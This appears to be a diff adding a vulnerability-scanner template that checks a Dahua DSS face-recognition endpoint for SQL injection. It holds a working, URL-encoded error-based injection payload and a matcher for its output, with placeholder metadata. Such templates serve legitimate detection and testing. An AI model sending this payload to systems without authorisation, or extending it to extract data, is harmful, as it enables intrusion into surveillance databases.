@@ -1,0 +1,18 @@
+id: dahua-dss-searchJson-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: 大华DSSgetFaceRecognition接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--%22%7D/extend/1"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b92'
